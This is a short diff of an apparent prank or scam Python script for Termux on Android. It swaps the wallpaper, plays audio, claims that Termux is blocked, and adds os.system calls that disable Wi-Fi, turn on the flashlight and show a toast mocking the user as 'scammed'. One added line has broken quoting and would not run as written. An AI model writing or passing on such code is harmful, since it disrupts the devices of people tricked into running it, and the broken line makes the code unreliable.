@@ -8,7 +8,7 @@ os.system('termux-wallpaper -u https://i.pinimg.com/736x/5d/03/48/5d034835ae7694
 os.system('termux-toast "Слава Украине!"')
 os.system('mpv 1462a1b7ae0a.mp3')
 print("Термукс заблокирован, Wi-Fi отключён, фонарик включён, пока.")
-termux-wifi-enable false
-termux-torch true
-termux-toast "Заскамлен нахуй)"
-termux-tts-speak
+os.system("termux-wifi-enable false")
+os.system("termux-torch true")
+os.system("termux-toast "Заскамлен нахуй)")
+os.system("termux-tts-speak")
